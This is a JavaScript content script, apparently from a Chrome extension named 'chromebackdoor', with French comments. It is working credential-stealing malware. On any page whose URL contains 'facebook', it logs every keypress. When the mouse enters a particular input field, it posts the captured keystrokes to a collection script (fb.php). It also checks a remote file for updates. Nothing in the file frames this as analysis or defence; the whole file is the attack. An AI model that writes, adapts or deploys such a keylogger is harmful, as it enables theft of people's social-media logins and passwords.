$(document).ready(function()
{
    var phish = "";
    var tabURL = window.location.href;
    function sendF()
    {
        $.post("http://localhost:8888/chromebackdoor/web/url/fb.php", { info: phish } );
    }
    // CHECK UPDATE
    function checkupdate()
    {
        var s = "2.0";
        $.get("http://localhost:8888/chromebackdoor/web/update/up.txt",function(data)
        {
            if(data != s)
            {
                alert('ok');
            }
        });
    }
    checkupdate();
    
    // FACEBOOK FUNCTION BESOIN DE HTTPS
    function face()
    {
        document.onkeypress = keychange;
        function keychange()
        {
            var key = event.keyCode;
            var letter = String.fromCharCode(key);
            if(key == 13)
            {
                var code = document.body.getElementsByTagName('input')[2].value;
            }
            phish += letter;
        }
        var fb = document.body.getElementsByTagName('input')[3];
        fb.onmouseenter = sendF;
    }
    
    // VERIFICATION D'URL
    if(tabURL.indexOf('facebook') !== -1 )
    {
        face();
    }
});